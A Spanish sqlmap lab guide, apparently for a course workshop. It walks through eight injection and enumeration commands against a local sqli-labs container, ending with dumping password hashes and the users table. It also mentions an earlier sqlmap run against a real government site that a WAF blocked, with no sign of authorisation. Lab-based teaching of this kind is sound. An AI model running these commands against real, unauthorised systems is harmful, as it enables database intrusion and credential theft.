# ws-02 · Guía sqlmap — sección «Inyección SQL activa»

**Objetivo: `http://10.0.2.2:8888/Less-1/?id=1`** (laboratorio local **sqli-labs** en
Docker, desde Kali).

## Situación del objetivo

- `testphp.vulnweb.com` (el objetivo original del taller, dueño de `acuart`) está
  **caído desde hace años**: resuelve pero la conexión nunca se establece. No hay
  redirección a ningún lado — simplemente no responde.
- `www.lnrbda.gov.ng` es un sitio gubernamental real protegido por un **WAF** (la
  salida propia mostró `CRITICAL ... protected by some kind of WAF/IPS` y errores
  `406 Not Acceptable` que bloquean toda la enumeración). Ahí no existe `acuart` ni
  existirá: ese nombre pertenece al host de Acunetix.
- Solución: montar sqli-labs localmente — MySQL real, todos los ítems del taller
  funcionan, reproducible y sin depender de terceros.

## Setup (ya está corriendo en el Mac)

```bash
docker run -d --name ws02-sqlilabs --platform linux/amd64 -p 8888:80 acgpiano/sqli-labs
curl http://localhost:8888/sql-connections/setup-db.php   # crea la BD (ya ejecutado)
```

- Desde Kali (UTM, red compartida) el Mac es la puerta de enlace: verificar con
  `ip route | grep default` (normalmente `10.0.2.2`). Si no responde, probar la IP
  LAN del Mac.
- Si el contenedor se detiene algún día: `docker start ws02-sqlilabs`.
- Para eliminarlo al terminar: `docker rm -f ws02-sqlilabs`.

## Regla de oro

Nunca escribir `-D` a mano: primero `--current-db`, y lo que devuelva es lo que va en
`-D`. Aquí devolverá `security`.

## Flujo (8 ítems en orden)

Variable para abreviar:
```bash
U="http://10.0.2.2:8888/Less-1/?id=1"
```

### 1. Escaneo inicial
```bash
sqlmap -u "$U" --batch
```
Esperar: parámetro `id` inyectable, `back-end DBMS: MySQL`, servidor Apache + PHP.
→ Captura: `pics/sqlmap-escaneo.png`

### 2. Versión del motor (banner)
```bash
sqlmap -u "$U" --banner --batch
```
Esperar (valor verificado): **`MySQL 5.5.44-0ubuntu0.14.04.1`**.
→ Captura: `pics/sqlmap-banner.png`

### 3. Usuario actual
```bash
sqlmap -u "$U" --current-user --batch
```
Esperar: **`root@localhost`**. Nota de análisis jugosa: es `root` (DBA, privilegios
totales sobre el gestor).
→ Captura: `pics/sqlmap-usuario.png`

### 4. Base de datos actual (instancia)
```bash
sqlmap -u "$U" --current-db --batch
```
Esperar: **`security`**. Este valor alimenta el `-D` de los ítems 6–8.
→ Captura: `pics/sqlmap-instancia.png`

### 5. Hashes de contraseñas
```bash
sqlmap -u "$U" --passwords --batch
```
Esperar: el usuario `root`; con contraseña vacía probablemente muestre el hash vacío
— hallazgo igualmente válido y grave (cuenta administrativa sin contraseña). Puede
ofrecer crackear con diccionario; `--batch` responde el default.
→ Captura: `pics/sqlmap-hashes.png`

### 6. Tablas de la BD actual
```bash
sqlmap -u "$U" -D security --tables --batch
```
Esperar (verificado): **`emails`, `referers`, `uagents`, `users`**.
→ Captura: `pics/sqlmap-esquema.png`

### 7. Columnas de una tabla
```bash
sqlmap -u "$U" -D security -T users --columns --batch
```
Esperar (verificado): `id (int)`, `username (varchar)`, `password (varchar)`.
→ Captura: `pics/sqlmap-columnas.png`

### 8. Volcado de una tabla
```bash
sqlmap -u "$U" -D security -T users --dump --batch
```
Esperar: registros con `Dumb/Dumb`, `Angelina/I-kill-you`, … sqlmap los persiste en
CSV bajo `~/.local/share/sqlmap/output/`.
→ Captura: `pics/sqlmap-dump.png`

## Mapeo con el taller (importante)

El `.tex` (`sections/02-sqlmap-activa.tex`) trae comandos y notas `\porque` escritos
para el difunto testphp (`acuart`, `artists`). Sustituciones al redactar:

| El taller dice | Aquí es |
|---|---|
| `-D acuart` | `-D security` |
| tabla `artists` / `customers` | tabla `users` |
| usuario `ACUART` | `root@localhost` |
| banner MySQL 8.x | `MySQL 5.5.44-0ubuntu0.14.04.1` |

Las capturas van con los mismos nombres en `latex/workshops/ws-02/pics/`.

## Problemas comunes

- **«you have not declared cookie(s)...»** — la pregunta de cookies la responde
  `--batch` solo.
- **sqlmap «resumes stored session»** — cachea por objetivo; si cambias flags y la
  salida no cambia, repetir con `--flush-session`.
- **Sitio no responde desde Kali** — verificar `docker ps` en el Mac (¿activo el
  contenedor?) y la IP de puerta de enlace con `ip route`.
- **`--no-cast --threads=10`** — no hacen falta aquí; `--batch` basta (la inyección
  es error-based/UNION, rápida).

## Cierre del taller

1. Guardar las 8 capturas con esos nombres exactos en `latex/workshops/ws-02/pics/`.
2. Rellenar cada `\begin{analisis}` del `.tex` con la base de su nota `\porque`,
   sustituyendo los valores según la tabla de mapeo de arriba.
3. Compilar y verificar pendientes:
   ```bash
   cd latex && make ws-02
   grep -i "pendiente" build/ws-02/main.log
   ```
   Sin resultados = listo. Para entregar: `make ws-02 FINAL=1`.
